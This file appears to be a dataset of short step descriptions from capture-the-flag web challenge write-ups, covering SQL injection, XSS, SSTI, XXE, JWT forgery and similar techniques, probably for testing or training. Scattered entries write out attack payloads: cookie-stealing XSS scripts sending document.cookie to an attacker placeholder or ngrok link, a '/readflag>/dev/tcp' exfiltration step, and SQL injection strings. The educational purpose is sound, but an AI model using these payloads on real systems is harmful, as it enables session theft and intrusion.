[
    "Use this method to bruteforce the admin token one character at a time",
    "Exploit an SQL injection in the username parameter with the payload: username=adadminmin';#&password=",
    "Extracting the configs.zip file and analyzing the file named apache_ctf.conf",
    "Understand that MFA token is only 4 digits and take advantage of this limited search space by sending batches of thousands of queries together, thereby reducing the number of required CAPTCHA responses.",
    "Realized that .php extensions were being recursively filtered",
    "Locate where 'store.key' is defined using 'crypto.randomBytes' and when this function is called, and pay attention to what actions trigger the key's update.",
    "Notice the website contains only a login form that might be vulnerable to SQL injection",
    "Note that the flag of the challenge is represented as 'SharifCTF{MD5(lowercase(Hello_Rules))}'",
    "Altered the JWT's header to change the algorithm to HS256, and payload to change the user type to admin.",
    "Identifies a SQL injection vulnerability in the 'data-server' project.",
    "Retrieved column names of 'startup_users' table from the database using the SQL query",
    "The verify() function includes three checks: verifyUsername(), verifyPassword(), and verifyMFA().",
    "Separate WebSocket packets into ones that are related to sent messages (particularly user input) and unrelated ones such as 'pings'.",
    "Using Accessibility Tool, call a range from the document",
    "By using curl command with the previously hardcoded auth cookie value, successfully retrieve the flag",
    "Download the provided 'src.zip' file and 'flag.png.encrypted' file from the challenge description",
    "Used the script available at https://github.com/lijiejie/ds_store_exp to extract hidden data from the .DS_Store file.",
    "Identify that the vulnerability exists because the username taken from the session is not properly sanitized",
    "Recognize the challenge requires locating a flag in /var/www/html/flag.php on a web server",
    "A negative 'rate' value was inputted when updating the status to bypass the duration check",
    "Serialize, encode, and then URL-encode the custom `Login` object.",
    "Expect to get a reverse shell as a result.",
    "Open the provided challenge link to view a login form",
    "Learned that the search feature places the query into the URL's fragment identifier",
    "It was discovered that the payload needed to be adjusted to work with `nunjucks`, this was done by making sure line 1 and 3 of the payload were written in a specific way",
    "Analyze the website and discover it is running on Flask",
    "Tried passing custom callback parameter to `api.php` endpoint",
    "Open a pop-up to the target URL from a sandboxed page, thus causing the pop-up to inherit the sandboxed attributes",
    "Identified behavior: if SSRF is detected, a specific message is returned. Blacklist works based on 'localhost' and '127'.",
    "Created a local repository and initialised a local Bazaar repository.",
    "Investigate the GitHub Actions workflow runs, noting that the value of FLAG_AUTH is starred out",
    "Identify that the web application is running on node.js and that `package.json` should be present on the system",
    "Use the commit IDs to fetch further git objects from the server",
    "Flag obtained: 'dsc{th15_15_w4y_t00_much_w0rk}'",
    "Post content prints out with 'self.__dict__' in the preview of the webpage on trying the above method",
    "Used a new approach not involving factorization to achieve a payload with an even smaller character size",
    "Tried to exploit Shellshock by injecting commands via 'User-Agent' HTTP header using curl command.",
    "Recreating the GZip archive with the hexadecimal content using an editor",
    "Examine the 'challenge/index.js' file in the source code zip.",
    "Discovered how the app uses local storage to save notes",
    "Noted that both Nginx and Apache block '/debug*'.",
    "Reveal the hidden sheet which gets added to the panes",
    "Identified a file 'flag_for_this_INFERNO.txt' in the listed contents indicative of the flag for the challenge.",
    "Opened the www.zip file to find the source code of the web app",
    "Used the 'ls -al' command to enumerate the directory's files",
    "Enumerated the 'flag_is_here' directory",
    "Converted hex to string from 'line 1' of the JS file with a Python script",
    "Identify how to exploit the object injection vulnerability: By injecting custom objects into user data, you can modify protected attributes and bypass authentication.",
    "Received the flag as response to the request with the admin jwt token",
    "Analyzed the source code for potential flaws",
    "Understand that the correct 'auth' cookie is set at the '/auth' endpoint when the request is made locally by the admin bot",
    "Followed the redirection link after replacing the 'with' value with 'flag'.",
    "Analyze the source code of the webpage, noticing it is a 'Markdown' converter that uses regex.",
    "Understand that even though '../' is replaced in the code, it can still be bypassed using '....//'",
    "Checked the filter page again to see any changes",
    "Received the flag: MeePwnCTF{__133-221-333-123-111___}",
    "Implemented an error-based approach using 'Updatexml()' in the SQL payload.",
    "Find the third part of the flag in the path academic/developers/secrets/final.txt",
    "Derive a proof-of-concept (PoC) to brute-force a character of the flag by exploiting the observed behavior",
    "We use a common XSS code: '<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>' to redirect to our webpage by changing the 'document.location' and setting the 'c' argument to 'document.cookie', which contains the current page's cookies.",
    "Identifying that process.env.FLAG in db.createNote({ data: process.env.FLAG }) is storing the flag.",
    "Noticed leaks of bash history in the logs",
    "Uploaded the XML payload to the 'trial' tab of the web interface.",
    "Recognized that /api/flag-plz is mapped to /forbidden, and /api is mapped to /.",
    "Made a fetch request with polluted `credentials: include` option in `setFont.js` to use the credentials for `http://app/`",
    "Attempted to connect to the '.bzr' directory and received a 'HTTP 403 Forbidden' error, suggesting the presence of the folder.",
    "Received the iframe's contents: `PGhlYWQ+PC9oZWFkPjxib2R5PkFDU0N7c2hhcmtzX2FyZV9hbHdheXNfaHVuZ3J5fTwvYm9keT4=`.",
    "We need an actively running server to receive this request and log the cookie. A Python Flask application, does this in 'xss-cookie-stealer.py'. This script defines one route, '/', which reads the 'c' parameter in the request URL, opens a file called 'cookies.txt', writes the contents of 'c' parameter to that file, and then redirects to 'https://google.com'. We run this server on all interfaces '0.0.0.0' on port '16361'.",
    "Decided to print all file contents and search for the flag on the browser due to received multiple 'flag' files",
    "Found a target website with a login form having JavaScript check",
    "Identified the Content-Type as 'text/xsl', indicating potential for Cross-Site Scripting",
    "Realised that the server code for /api/filter endpoint does indeed return the hash of the user's token in the response",
    "Discovered valid usernames including `admin`, `root`, `builder`, `employee`, and `staff`",
    "Understand the loose comparison between two md5 hashes by the '==' operator in PHP",
    "Investigated behaviour of appending different strings after the '/pleb' directory in the site URL.",
    "Run the brute force PHP script",
    "The registration and login process was then studied. The JWT key was created for each new user during the registration process. This JWT key was used to sign the token when the user logs in.",
    "Identify that the server checks if 'text' is not included in 'xml.lower()'",
    "Attempted to find 'sdctf' in the logs using curl, but was unsuccessful",
    "Fourth step: Confirmed that the SameSite attribute of the cookies is set to None.",
    "Understand Wildcard Injection and how it can be abused to perform command injection attacks by manipulating the use of wildcards in system commands.",
    "Visited '/?file=/etc/passwd' to confirm server-side file inclusion",
    "Create a custom `User` and `Login` object to bypass the MFA token check.",
    "Attempt to access or replace 'store.key' through the Template Injection vulnerability, which may require redefining the Object prototype.",
    "Copy the output into the function body",
    "Receive 403 Forbidden, page indicating SQL Injection attacks are blocked.",
    "Locate the function addCaptcha() in the JavaScript code, this function creates the captchas and makes them move",
    "Sending the payload to the server using curl command",
    "Perform a POST request to the path provided by the decoded message",
    "Use jwt_tool with 'rockyou.txt' to brute force the token",
    "Discovered the flag within the content of the index.php file",
    "Identify that the first check points to a GET parameter with underscores but query string cannot have underscores",
    "Bypassed the character limit issue by passing the password with Burp Suite",
    "In the shared object file `shellme.so`, the function `shellme()` gets tracked, leading to a function `shell_this()`, where the given input copies to a mmap-ed memory region",
    "Here we can see an 'if' condition which looks like the logic behind the login function",
    "Found a JSON response with a message hinting that the flag was already visible",
    "Executed an 'id' command to get user information",
    "Ran another series of SQL queries via URL manipulation to obtain table names from information_schema.tables",
    "Notes that because the server does not have CURL, a python script is used to send requests.",
    "Visited the given URL in the challenge",
    "Extended analysis of the vulnerability showed that the encryption function in PHP-Proxy was not secure, as it could be reverse-engineered to reveal the encryption key.",
    "Developed the XSS payload using <img src='x' onerror='PAYLOAD'> by using the fact that JavaScript is a case-sensitive language, and our payload is converted to uppercase before being written to the innerHTML.",
    "Ran a JavaScript snippet to test different elements for vulnerabilities with the DOMPurify sanitizer and `<math>` element bypass.",
    "A script was written to implement the attack involving 'Lazy-loading' property.",
    "Verify the user data.",
    "Understand that the WebSockets library used, flask_sockets is quite old, with no vulnerability in the ws.origin",
    "Use jwt.io on token value",
    "Identify that the challenge is a Cross-site Scripting (XSS) challenge which involves exploiting a page to pop up an alert.",
    "Inspect the returned data to retrieve the flag, which is 'flag{user_agents_undercover}'",
    "Understood that the server uses Python's requests library to issue GET requests to the submitted URL and returns response headers.",
    "Finally, the attacker exploited the system by sending a crafted POST request with malicious payload to change the status of the services, which performed an RCE due to Prototype Pollution, leading to the flag.",
    "Confirmed the flag on the website by changing the cookie values: userID to 768 and username to 'admin'.",
    "Realised that the token was using RS256 algorithm.",
    "These checks included whether the 'enableapi' query parameter was set to 'true', if 'recv' query parameter was a subdomain of 'jsapi.tech', and if the window was framed or opened by another window.",
    "Accessed this index to leverage `subprocess.Popen` to achieve Remote Code Execution (RCE)",
    "Retrieved the flag 'S3D{G0_De3Per_L1k3_a_pr0_r3d_T3aMEr}'",
    "Understood that the admin bot visits any URL provided, first storing a flag as a note on the challenge server",
    "Confirmed that the flag begins with 'CHTB{'",
    "Identified a mutation with the `<table>` element that could be simplified to create the exploit.",
    "Requested http://104.197.168.32:17012/bashferno.cgi and received HTML content suggesting Shellshock vulnerability.",
    "Attempted to access the admin console ('/login.php') and received a 403 Forbidden response.",
    "The HTML source of the webpage contains a treasury.js file useful for understanding actions performed.",
    "Receive a response with the flag embedded in the HTML content",
    "Used the discovered cookie to reveal the flag: p4{wtf_php_comparisons_how_do_they_work}",
    "Identify that this successfully runs a SQL query and returns different messages based on query results",
    "The received request from the proxy contains the 'secret' cookie value",
    "Find and analyze the source code for 'flagchecker.c' in the repo",
    "Note that '.' and 'js' have to be the last two elements of the array to pass the file type check",
    "Exfiltrating the original /secret.html page by making a GET request with a 'Range' HTTP header",
    "Analyzed the cookies and found a base64 encoded value",
    "Sent the admin to the page with the payload, and the flag was found the profile: 'ctfzone{0190af5705a38115cd6dee6e7d79e317}'",
    "Identify a prototype pollution vulnerability in '/api/tet/list' when merging request data.",
    "Used the generated 2FA code to perform another CSRF attack on the admin",
    "Identified that the system might be susceptible to an XXE (XML External Entity) attack based on the mention of XML.",
    "Visited the source URL provided for the challenge.",
    "Created an XML HTTP request that references the /etc/flag.txt directory",
    "Realize the session file can be accessed through the LFI vulnerability, and the set input is reflected in the included PHP code.",
    "Used a Python script to brute force the password",
    "Understood that the API is powered by Werkzeug, which includes a debugging console at '/console' when debugging is enabled",
    "Execute SQL injection to manipulate the query and fetch data using union operation.",
    "Checked if a 'upload' page existed due to its mention in the challenge description and found it did",
    "Understand that due to the parameter being reflected in the response, the system may be susceptible to XXE attacks",
    "Noticed a redirect to a different domain when fetching an image, indicating another possible server",
    "Identified LFI vulnerability to view '/etc/passwd'",
    "Bypassed '_', '\\', 'class', 'subclasses', 'getitem' by constructing a string",
    "Discovered that the value 'false' is forced into the admin field during the normal registration process",
    "Used RegEx payload to confirm presence of characters in the password",
    "Decided to exploit the SSRF vulnerability by making an internal request to the '/admin' path",
    "The challenge starts with a given URL: https://poems.asisctf.com/ directing to a website containing a list of books.",
    "Guessed that the following endpoints were present: '/circle/one/', '/two/', '/square/', '/com/seaerch/', '/vim/quit/.'",
    "Interpreted how 'pkg' and 'pkgPath' can be controlled by polluting '__proto__.data' and '__proto__.path'",
    "Logged in with the newly created admin account and retrieved the flag",
    "Investigate response on submitting a single comma as input",
    "Attempt to change status to 'premium' resulted in 'Permission Denied!' message",
    "Examine the 'flaghash.sh' script to understand the process: it makes a cURL request to an IP address, hashes the results using MD5, and sets the cookie 'auth' to the value of 'FLAG_AUTH' from the secrets",
    "Locate 4 key cookies: admin, authenticated-user, made-an-account, and visited-main-page",
    "Started testing for potential XPath injection points in the application.",
    "Determined that the result of the SQL query was used to populate the PHPSESSID cookie by analyzing the HTTP responses.",
    "Identify the app is a page with a form to create users which indicates if they are admins",
    "Discovered the website takes a 'name' parameter",
    "Analyzed the web page and noticed the tag `XXE` for `XML external entity`.",
    "Identified a 'Mutation' query in the graphql schema which allows change of a user password",
    "Get a reverse shell on the Python microservice to obtain the flag",
    "Used a backslash as username and ' OR 1=1;#' as password for SQL injection to login as admin",
    "Inspect the provided Nginx configuration for any vulnerabilities",
    "Access the provided source code and link to the running instance upon starting the challenge instance.",
    "Focused on the command line subprocess interaction in this line: 'subprocess.Popen(f\"ffmpeg -i 'uploads/{file.filename}' \\\"uploads/{uid}/%03d.png\\\"\", shell=True)'.",
    "Identified an S3 bucket in the HTML source",
    "Created final payload using all the methods of bypassing and injecting discovered",
    "Constructed a payload to do a redis.call() to set the serialized object with the sessionID and made a GET request to /login/ to trigger the deserialization",
    "Discover that 'passcode' values are the first 8 characters of the hashed 'nonce' value",
    "Appended the new script to the body of the document.",
    "Identify PHP object injection vulnerability through unserialize() function.",
    "Used the SQL injection payload to retrieve the flag",
    "Read the problem's given details and description, identified it's a Web category challenge, with a goal to perform an XSS attack and make a URL to trigger alert(1) for getting the flag",
    "Investigated methods for exploiting XSS attacks accessing XSL document",
    "Noticed that the page used relative JavaScript paths, and that the scripts were always executed due to the `nonce` in the CSP.",
    "Experiment with the session_id by changing the hashed value to correspond to different usernames",
    "Examined 'auth.py' and identified that a successful password reset would set 'user.active' to 'True', activating the user account",
    "Put the phar file into the exploit with specified URL to run the exploit",
    "Verified the xss at URL",
    "Performed a basic analysis of the cookies and found a 'secret' cookie",
    "After this I tried to remove the 'password' key",
    "Accessed the website and found out it is an online calculator",
    "Investigated methods for exploiting XSS attacks accessing XSL document",
    "Given the clues in the challenge hint, performed a certificate search using crt.sh",
    "Identify the '/admin' directive in the Nginx configuration that denies all requests",
    "Noticed the loading splash screen is identical to the challenge website",
    "If the script gets to a point where no character in the alphabet is causing a change in content length, break the script.",
    "Identify the need to steal the identifier and the saved note from the main page using a valid identifier",
    "Realize that the endpoint `getimg.php` is vulnerable to Local File Inclusion (LFI), allowing files on the server to be read",
    "Observe that the service doesn't allow for file:// protocol as it validates the URL to be HTTP(S)",
    "Retrieved a POST request that contained the final flag in the response.",
    "Decoded the 2FA token received from previous step to obtain admin 2FA code",
    "Noticed that the iframe also posts the response from the /api/filter endpoint to window.parent, meaning any site can create an iframe of the web application and receive the message",
    "Noticed the feature using SQLite through filters and SQL statements",
    "Spoofed the client IP address by using the X-Forwarded-For header",
    "Finally, it allowed receiving the flag, which is the proof of successful authentication.",
    "Converted the file content to base64 to ensure that the PNG file content is transferred without any encoding issues",
    "Study the source code and identify that there are checks for specific patterns that will allow or block request",
    "Wanting to create an XSS payload, started by analysing how the web application processes Markdown",
    "Received another response containing a different flag value",
    "Used PORT ftp command to SSRF to rabbitmq http API (utilized REST to discard the png header from the uploaded file)",
    "Find the 'access_log' class in authentication.php, which has a '__toString()' function that can return the contents of a file",
    "Hypothesized that the login page might be filtering requests by the user's IP address.",
    "Using the '{rating[comments][0].__class__.__init__.__globals__}' format string, 'globals' objects can be accessed",
    "Used the following payload: 'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #.",
    "Used lesscss to evaluate CSS on the backend and read arbitrary files with @import (inline) \"/etc/passwd\";",
    "Submitted the form presented on the webpage",
    "Observe that due to request length limits around 3000 queries are batched at a time.",
    "Decoded the received Base64 string to get the flag: `ACSC{sharks_are_always_hungry}`.",
    "The malicious JavaScript code is executed on client's side, which fetches an exploitative script and runs it in the background.",
    "Created new user with username 'FRONTEND_USERNAMEamount1337' to manipulate the message format",
    "Open the Browser Devtools to view the website's source code",
    "Receive a response that contains data from the /etc/passwd file, indicating successful exploitation of an XXE vulnerability",
    "Observed website which presented a login page with no additional information present or in the source code",
    "Understand that \u2018SCRIPT_NAME\u2019 can be set through an HTTP header, which can bypass the '/admin' denial in Nginx configuration",
    "Observed a form field requesting an IP address to execute a ping command",
    "Notice that the remainder of the session cookie is a signature that will be checked server-side to prevent tampering.",
    "Analyzing the provided Python server script 'http://35.207.189.79/pyserver/server.py'.",
    "Identified the problem requires generating two PDFs with the same MD5 hash, but different content.",
    "Recognized that this single request contains the admin's 'Cookie' and 'X-Access' headers",
    "Identified that if the request token is wrong, then the 'request.accessGranted' attribute would not be set and is thus undefined",
    "Accessed the challenge URL: http://freewifi.ctf.umbccd.io/",
    "The LOG data returns with the flag inside.",
    "Set IDSEED with 'id\u306e\u7a2e' as given in the code",
    "Opened port 80",
    "Investigated Angular's source code and discovered a 'primary' segment.",
    "Attempted to login with 'admin', 'admin' as username and password, which was not possible",
    "Locate routes to '/login' and '/adminNames' in the website source.",
    "Received the flag in server logs as a cookie in the HTTP GET request.",
    "Tried different versions of the Twitter login page to authenticate on behalf of the admin without success.",
    "In the script, generate a tripcode for each possible IP and compare it with the target",
    "Observed possibility of XSS attack from bot's lens when it visits the URL provided on the page.",
    "Understood from the provided python code that username and password are 'backd00r' and 'catsrcool' respectively.",
    "Visiting the website and finding a cookie that contains a JWT hashed with HS256.",
    "Successfully extracted the flag: OOO{0ld@dm1nbr0wser1sth30nlyw@y}",
    "Craft a request which will manipulate the HTML structure, creating an insertion point",
    "Accessed the provided web page http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719",
    "Create account at ngrok, download the application, and login. Start the Flask python server with 'python xss-cookie-stealer.py' and then run '/ngrok http 16361'. Ngrok will display a URL in the form 'http://<subdomain>.ngrok.io'.",
    "Various SQL queries are tested to determine the type of database used",
    "Add data to the HTTP request specifying a JSON object '{\"foo\":\"bar\"}'",
    "Deduced that the value of $_[0], which is being compared in the If statement, can only be between '0' and 'f'",
    "Server was able to provide signature for this manipulated message",
    "Encountered a blacklist filter that prevents certain malicious characters or words.",
    "Downloaded the src.zip file from the provided link",
    "Load the CTF challenge and look into the provided source code to understand how the application works",
    "Understand that exploitation of the website involves creation of a Stored XSS to exfiltrate the session cookies",
    "Found that the Preview button posts a message to the iframe, ensuring that the message is only sent to the intended receiver",
    "Bypassed character filter using wildcard '?' to match any single character in command arguments.",
    "Submitted final payload that contained a script, exploiting YouTube's JSONP response and BeautifulSoup's parsing differential",
    "Exploited an off-by-one error in `background.js` font validation to manipulate `utils.FONTS[10]` and bypass standard checks",
    "Discovered encryption function is not secure enough and can be decrypted.",
    "Created a malicious URL including the payload.",
    "Propose to escalate this vulnerability to Remote Code Execution (RCE) given a valid .js file using an attribute that can be polluted to spawn a new process or execute a command.",
    "Created a new JWT which is a combination of the altered header, payload, and the generated signature.",
    "Test a trivial payload with a length over 8kB and confirm it is not blocked.",
    "Navigate to '/adminNames', which prompts a file download containing a GitHub URL.",
    "Noted filter size limitation",
    "Estimated the SQL query structure in the website's backend, taking into consideration the potential manipulation of the 'moneys=' parameter",
    "Identified the challenge as an XPATH injection challenge",
    "Navigate the HTTP request smuggling attack by noting that the Flask server treats underscores ('_') as hyphens ('-') and allows duplicate 'Content-Length' headers",
    "Set the 'language' parameter to 'key' in the JWT token",
    "Ensure the site URL in the payload is using HTTPS to prevent Content Security Policy Bypassing",
    "Considered using a cache probing attack to detect whether a search was successful based on whether 'y.png' or 'n.png' was cached",
    "Upon examination of the site's JavaScript script 'script.js', it was found that it added the message event handler to the window after meeting several checks.",
    "Create a 8 byte file that is equivalent to the the data in `cipher + 0xd34db33f` and upload it. The key will be XORed with `cipher + 0xd34db33f`. If they are equivalent then the XOR result will be zero",
    "Deduced that style scoped only works in Firefox versions 21-54",
    "Discover that there is no limit to the number of attempts made with the same token, as long as correct CAPTCHA code is provided.",
    "This error reveals few things to us: python flask backend is used, the exceptions are showed in the alert pop up, 'name' key value pair are required",
    "Experimented with the meme generator functionality, noting the server requests",
    "Access the website of the challenge",
    "Seek the JWT secret by examining the request route for '/adminNames', i.e., '/getFile?file=admins'.",
    "Successfully bypassed login and accessed the admin portal",
    "Identified a vulnerability in the form due to command execution via shell",
    "Set up a netcat listener on my server",
    "Reloading the server script successfully changed the website content from the original message to the target flag value 'csictf{h3r3_i_4m}'.",
    "Realize that while a user can be registered, the 'magic code' needed to login won't be received via email",
    "Progressively brute-forced characters, checking successful log-in messages to determine correct characters",
    "Confirmed that there was a directory traversal vulnerability in the POST filename",
    "Used a redirection through a PHP server, which revealed the flag in one of the headers.",
    "Upload a DOCX file and observe the output details, noting that the number of pages is shown",
    "Successful brute-force attack provided a URL that returned the flag upon visiting.",
    "Submitting the crafted URL to the Admin Bot, which visits the URL causing the XSS payload to execute",
    "Loops through a list of characters, appending each character to an initial flag string. In each loop, a script is created and encoded into base64. This script is sent as an SSTI payload.",
    "Created a PHP file named 'payload.php' that listed all directory files to check for 'flag' files",
    "Noticed that MySQL was being used",
    "Discovered a 'flag_is_here' directory in the root directory",
    "Identify that the form only allows the uploading of PDF and DOCX files",
    "Used the crafted token as a cookie to access the /flag directory.",
    "Examined the application's source code, specifically routes: `index.js`, `login.js`, `logout.js`, and `signup.js`",
    "The backend checks for the 'secret' cookie before returning the flag",
    "So i simply started looking for flag, look for elements in the /home dir",
    "Retrieved the link to the admin portal from student communication",
    "Access the provided URL to submit the form and retrieve the flag",
    "Attempted to use the local-host address to access the admin panel of the website.",
    "From the file index.html, use the LaTeX function \\StrMid from the xstring package to isolate the '/' symbol.",
    "Implemented a loop in the Python script to iteratively read the transmissions",
    "Used 'php://filter/' to Base64 encode the output of the PHP 'phpinfo()' function and reflect the result into the 'user' tag of the HTML response",
    "Understand that if the expected value does match, a new CAPTCHA is generated.",
    "Discovered user details were stored in a JavaScript variable in the webpage response",
    "Logged in with the new password",
    "Identify that the 'member' field is currenctly set to 0.",
    "Printed the content of the index.php file using 'cat index.php' command",
    "Perform a bruteforce attack by comparing all characters in a possible range",
    "Utilize this character set in conjunction with three commas as to meet the requirement",
    "Realized that 'eval' can be triggered by entering a payload as the GET query parameter",
    "Registered a new user and attempted to login which returns 'User not active' error",
    "Used character substitution '$()' to get the required strings for password.",
    "Research about PhantomJS/2.1.1 and identified a known vulnerability (CVE-2019-17221)",
    "Saw a statement on DOMPurify's GitHub indicating that using the sanitized HTML with jQuery's insecure elm.html() method without the SAFE_FOR_JQUERY flag could lead to XSS",
    "Discovered that the website is using PHP eval() function",
    "Test the system's reaction to an invalid productId value",
    "Ran SQLMap with the script using the command 'sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump' to dump the database",
    "Serialize the created object and encode it in base64 format.",
    "Upon granting admin privileges, modify the 'Pipe the emails through' command to send the flag to an external server using the '/readflag>/dev/tcp' command with the server's IP address and port number",
    "Understood the user registration process, where data is packed in the format 'username:password:admin'",
    "Successfully obtain a reverse shell on the target system.",
    "Read the flag",
    "Attempted a cookie stealing challenge by sending the payload <img src=x onerror=this.src='<NGROK-LINK-HERE>/?'+document.cookie;>",
    "Ruled out mutation XSS attacks on these libraries as 'marked' does not sanitize output HTML.",
    "Final server returned Server: Apache/2.4.50 (Unix), which is known to be vulnerable to a recent path traversal vulnerability",
    "Decode the session data from the cookie using Base64 decoding on a site like cyberchef",
    "Understood the potential of an 'HTTP Desync Attack' CL.TE scenario from viewing the backend infrastructure.",
    "Studied the official `mysql` docs to understand how objects are handled",
    "Established the coordinates of the point of interest for distance calculations",
    "Developed a script which aims to index the characters in 'P4s5_w0Rd' string and reconstructs it into 'sRPd45w_0'.",
    "Receive the flag in the response from the server",
    "Expected to find the flag before the suspicious commit and used 'git diff' command to check differences between that commit and its preceding commit",
    "Examine the buy endpoint to understand purchasing requests and conditions.",
    "Identified a hidden field 'password' where the value was taken from the cookie",
    "Analyze the AsmBB source's render2.asm file, which contains a hash table of commands used by the templating engine",
    "Observe the site fetching resources at '/ajax/articles?cat=news' and inserting them into the 'ajax-load' element",
    "This allows the addition of DOMPurify-sanitized HTML into the child iframe if a postMessage starting with 'NOTE_APP_SET_REQUEST' is sent.",
    "Located the flag at `/users/employee/files/fileadmin`",
    "Execute a Python script (solve.py), eventually obtaining the flag",
    "Confirm the password from a known resource.",
    "Started with examining the Dockerfile provided",
    "Noticed that user cookie is double base64 encoded",
    "Try to load a webpage associated with the 'admin' user",
    "Cited the page http://104.197.168.32:17012/index.html as the challenge target with an Apache2 default index.",
    "Found the app at `http://whatever.domain.com/app/`.",
    "Continue the decoding process by solving for 'c' in the equation: c = seed, c0 = c + prev_encoded_arr[0] * 256, encoded_arr[0] == c0 % 58. Note that only 'encoded_arr[0]' is known, and 'seed' is the actual character of 'msg' that we are trying to find.",
    "Making a GET request to 'http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg' to trick the server into thinking that the request is coming from the same host.",
    "Identified an interaction with the website that involves a 'counter' cookie",
    "Change the window's location back to the exploit server for similarity of origins.",
    "Used the group_concat() function to obtain all entries in a column as a single row",
    "Identified that the input was being reflected into an XSL document",
    "Instead, navigate to /index.phps to reveal source code for index.php",
    "Found 3 log file links in the blog",
    "Found a cookie named userData with userID and username.",
    "Used an SMS message to invoke the call to the 'render_template_string' function and in turn, the 'add_money_to_login' function",
    "Identify the upload form on the website",
    "A script using 'setTimeout' function was written to execute the timing attack.",
    "Noticed that the decrypted string formed a flag when the chunks were concatenated",
    "Read challenge and note hints about versioning control systems, specifically git",
    "Use the output of the script to craft a URL with the identified character",
    "Interpreted the PHP script to find a new endpoint for POST requests",
    "Used wildcard '?' to access '/etc/hosts' file.",
    "Connected to the provided web site and was presented with an authentication form displaying the user's IP.",
    "Test a variety of charecte, ['%', '[', ']', '\"', '+', '_'] to bypass the template engine",
    "When faced with a security check, attempt to bypass it by loading image URLs directly",
    "Post a message with XSS attack using an `img` tag on `https://xmas.2020.chall.actf.co/post`",
    "After the combined size of the uploaded files exceeds the size of 10 tar records, trigger the exploit by sending a GET request to '/download_all'. This executes the tar command with wildcard arguments, causing it to execute the payload in 'shell.txt'.",
    "Used interp to evaluate Golang at runtime from cookie;",
    "Decided to overwrite '.bashrc' file, which would execute when the user 'manhndd' SSH-es into the server",
    "Review AWS WAF documentation, particularly for rules blocking longer payloads.",
    "Knowing the flag was located in /var/www, prepared an XML payload designed to extract information from that location.",
    "Downloading the `openapi.json` to look for available endpoints",
    "Uploaded the two colliding PDFs to the challenge page to unlock the flag and source code.",
    "Found out the parameter 'uuid' in the request 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=<uuid>' is vulnerable to injections ( XSS/CSS ) and is limited to '36 characters'",
    "Switched to the console to log the \u201cCONFIG\u201d, in order to see what comes back",
    "Exploit log poisoning vulnerability in the application. Send a GET request to '/home' with the 'User-Agent' header value modified to include a Thymeleaf expression that fetches the value of the 'FLAG' environment variable (' + @environment.getProperty('FLAG') + '). This action modifies the logs and includes the value of 'FLAG' in the logs.",
    "Applied the payload to the live environment via the session cookie, resulting in the successful retrieval of the flag",
    "Approached the third 'If' statement, which appeared to be difficult to bypass due to its use of a secret flag within a MD5 calculation",
    "Executed the first successful exploit by plugging into the URL a modified payload with long sequence of directory traversal leading to '/etc/passwd'",
    "Connected to the website 'https://138.247.13.115.xip.io/' where the flag was displayed",
    "Used curl to send a POST request to the server's login endpoint",
    "Read and stored the content of the merged and initial PDF files in separate variables.",
    "Identify a second vulnerability in 'query_kill_time', which is a SQL Injection. However, there is a WAF 'Skynet' filtering the requests.",
    "Create an infinite loop that will run until the password is fully determined using the SQL Injection.",
    "Identified the end goal, i.e., is to get access to /flag. The JWT token has a role attribute that needs to be changed to admin before you can proceed.",
    "Analyze key aspects of the code, such as JwtService.java and SecretGenerator.Java, to better understand the website's security processes.",
    "Receive an HTTP response containing the Flag",
    "Recovered the missing source files using Bazaar's 'revert' command.",
    "Leaked source code;",
    "Used the session cookie to visit /flag and collect the flag",
    "Realize that the sha1 hashes of 'hash' and 'target' will not match, so brute forcing is not a viable option",
    "Attempted performing a post request but it gave a 302 response",
    "Visited the challenge URL 'http://freewifi.ctf.umbccd.io/'",
    "Formulate a strategy to leak the debugging port, understanding that the port scan needs to be completed within 30 seconds before the browser instance is closed",
    "Review the input form logic and notice the use of Python's eval() function",
    "Identify that the code has a SQL injection vulnerability due to concatenating user input directly into the SQL query",
    "Navigate to root directory and read the flag.",
    "Used the 'glob' function to find interesting files",
    "Used Carriage Return Line Feed (CRLF) injection in the username to inject ftp commands",
    "Arbitrary HTML was injected, which would be rendered by pdfkit/wkhtmltopdf",
    "Researched and found that the 'flask_caching' module can optionally store a python pickle in redis with a prepended '!'",
    "Convince the server to communicate with arbitrary URL by bypassing regex using the provided loophole",
    "Attempted various SQL injection payloads on the login page from [swisskyrepo/PayloadsAllTheThings GitHub repository.",
    "Analyze the challenge which includes a text input for HTML notes and a rendered HTML page from textarea inside an iframe",
    "Analyzed the source code of the page and identified JavaScript functions that handle creation of iframe or appending script source, and a message event listener that conducts some checks on iframe data from URL.",
    "Attempted to connect to http://ctfchallenges.ritsec.club:4000/api/normal, received an error: Forbidden, missing JWT authorization.",
    "Check for notes that match the regex pattern 'flag{.*}', testing the filter",
    "Ran the script and yielded the payload to rearrange password.",
    "Encountered a login page with two authentication options: either with a username and password or a WifiKey.",
    "Found an 'index.php' file in the results",
    "Obtained the flag.",
    "Crafted a new SQL injection that directly passed 'flagman69' as the username column value using the 'UNION' clause",
    "Assigned the payload by sending the admin to our webpage, where we triggered 'window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=\"><svg/onload=$.globalEval(name)', <long payload>)', setting 'window.name' to '<long payload>'",
    "Receive the png in Base64 onto local machine",
    "Sent payload and received flag on the HTTP server",
    "Received the admin's hash on the exploit server, but realized that this is not enough to access the flag - admin's token access is required, which needs a CSRF to /api/flag, necessitating an XSS on the challenge server",
    "Recognized two flags; one hidden in angular endpoint /debug/answer restricted by Nginx and application, and one hidden in express endpoint /api/true-answer accessible only from localhost (IP: 127.0.0.1)",
    "Identified the above critical line that could potentially lead to Remote Command Execution (RCE) through its interaction with the filename being uploaded.",
    "Created a base64 encoded serialized data to inject into the 'login' cookie",
    "Accessed admin panel with intention to edit friend's grades specified over 4 semesters",
    "Revealed that session data is stored as a serialized pickle python object, which could potentially be exploited for a pickle deserialization vulnerability",
    "Entered the following answers in their respective text fields: 'Stoney' for Mother's Maiden Name, 'St. Michael's' for First School Attended, 'Science' for Favorite Primary School Subject, 'Marathon' for Favorite Olympic Event, and '1' for 2 + 2 - 3 = ?",
    "Explore the UI features such as: public feed, profile settings, report link, create post button, search, copy profile link, and followers",
    "Follow the Python script's process of resetting the session, generating and testing the payload, and increasing the sleep time between requests to avoid detection or session resets",
